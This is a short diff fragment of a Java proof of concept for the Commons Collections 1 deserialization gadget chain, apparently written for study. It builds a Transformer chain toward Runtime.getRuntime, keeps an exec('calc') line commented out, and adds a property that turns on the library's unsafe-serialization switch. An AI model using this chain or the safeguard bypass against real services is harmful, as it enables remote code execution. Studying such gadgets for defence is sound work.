@@ -16,6 +16,8 @@ public class cc1Lazy {
     public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
 //        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
         // next 记录，2024/12/05 电脑更新的时候被我强制更换电源寄掉了,花了70难受
+        //补充安全省略设置
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
